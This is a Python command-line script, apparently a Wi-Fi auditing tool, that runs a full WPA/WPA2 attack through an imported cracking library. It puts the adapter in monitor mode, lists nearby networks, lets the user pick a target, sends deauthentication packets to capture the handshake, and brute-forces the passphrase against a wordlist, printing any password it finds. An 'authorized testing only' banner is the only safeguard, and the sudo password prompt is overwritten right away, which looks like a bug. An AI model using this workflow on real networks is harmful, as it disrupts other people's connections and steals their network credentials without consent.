from wifiwpa import crackwifi
import os
import time

# ============================================================================
# BANNER
# ============================================================================
def print_banner():
    """Print startup banner"""
    os.system('clear' if os.name == 'posix' else 'cls')
    
    banner = f"""
    ╔══════════════════════════════════════════════════════════════╗
    ║                                                              ║
    ║   ██╗    ██╗██╗███████╗██╗                                    ║
    ║   ██║    ██║██║██╔════╝██║                                    ║
    ║   ██║ █╗ ██║██║█████╗  ██║                                    ║
    ║   ██║███╗██║██║██╔══╝  ██║                                    ║
    ║   ╚███╔███╔╝██║██║     ██║                                    ║
    ║    ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝                                    ║
    ║                                                              ║
    ║         █████╗ ██╗   ██╗██████╗ ██╗████████╗ ██████╗ ██████╗ ║
    ║        ██╔══██╗██║   ██║██╔══██╗██║╚══██╔══╝██╔═══██╗██╔══██╗║
    ║        ███████║██║   ██║██║  ██║██║   ██║   ██║   ██║██████╔╝║
    ║        ██╔══██║██║   ██║██║  ██║██║   ██║   ██║   ██║██╔══██╗║
    ║        ██║  ██║╚██████╔╝██████╔╝██║   ██║   ╚██████╔╝██║  ██║║
    ║        ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝║
    ║                                                              ║
    ╚══════════════════════════════════════════════════════════════╝
    
         ⚡ WiFi Auditor v2.0 - Wireless Security Framework ⚡
    
    ┌───────────────────────────────────────────────────────────┐
    │  Author  : Kevin Loi                                     │
    │  Version : 2.0.0                                         │
    │  Build   : {time.strftime('%Y-%m-%d %H:%M:%S')}                          │
    │  Target  : WPA/WPA2 PSK                                  │
    │  Modules : [+] Monitor Mode  [+] Handshake  [+] Crack    │
    └───────────────────────────────────────────────────────────┘
    
    ⚠  WARNING: For authorized security testing only! ⚠
    
    [*] Initializing framework...
    [*] Loading modules...
    [+] Ready.
    """
    print(banner)
    time.sleep(0.3)


# ============================================================================
# MAIN
# ============================================================================
valid = None

if __name__ == "__main__":
    print_banner()
    
    password = input('[*] Enter sudo password: ')
    password = ''
    
    try:
        cracker = crackwifi(password)
        
        print("[*] Checking wireless compatibility...")
        cracker.check_wifi_compatibility()
        
        print("[*] Starting monitor mode...")
        cracker.starting_monitor_mode()
        print("[+] Monitor mode active on wlan0mon")
        
        print("[*] Scanning for networks...")
        networks = cracker.get_target_visible_terminal(scan_time=5)
        
        n = 1
        nets = []
        for name, info in networks.items():
            nets.append((n, name, info))
            n += 1
            
        if nets == []:
            print('[-] No networks found!')
        else:
            print(f"\n[+] Found {len(nets)} networks:\n")
            for net in nets:
                print(f"    [{net[0]}] {net[2]['essid']}  |  {net[2]['bssid']}  |  CH:{net[2]['channel']}")
            
            num = int(input('\n[*] Select target [1-' + str(len(nets)) + ']: '))
            wifi = nets[num-1][2]
            
            bssid = wifi['bssid']
            essid = wifi['essid']
            channel = int(wifi['channel'])
            
            print(f"\n[+] Target: {essid}")
            print(f"    BSSID: {bssid}")
            print(f"    Channel: {channel}")
            
            number = int(input('[*] Deauth packets [10-100]: '))
            print(f"\n[!] Launching attack on {essid}...")
            
            valid = cracker.get_handshake(bssid, channel, essid, number)
        
        print("[*] Restoring network services...")
        cracker.stop_monitor_mode()
        
        if valid:
            print("[+] Handshake captured!")
            print("[*] Starting crack...")
            time.sleep(1)
            
            cappath = os.path.join(os.getcwd(), 'handshakes', 'capture-01.cap')
            wordlistpath = '/usr/share/wordlists/cracker.txt'
            
            if os.path.exists(cappath):
                print(f"[+] Capture: {cappath}")
                print(f"[+] Wordlist: {wordlistpath}")
                print("[*] Cracking...\n")
                
                result = cracker.crack_handshake(wordlistpath, cappath)
                
                if result and result.get('password'):
                    print(f"\n{'='*50}")
                    print(f"[✓] PASSWORD FOUND!")
                    print(f"[✓] Network : {essid}")
                    print(f"[✓] Password: {result['password']}")
                    print(f"{'='*50}\n")
                else:
                    print("\n[-] Password not found in wordlist.")
            else:
                print(f'[-] Capture file not found: {cappath}')
        else:
            print('[-] Handshake capture failed.')
            
    except KeyboardInterrupt:
        print("\n[!] Aborted by user!")
        cracker.stop_monitor_mode()
        
    except Exception as e:
        print(f'[-] Error: {str(e)}')
        try:
            cracker.stop_monitor_mode()
        except:
            pass
    
    finally:
        print("[*] WiFi Auditor session ended.\n")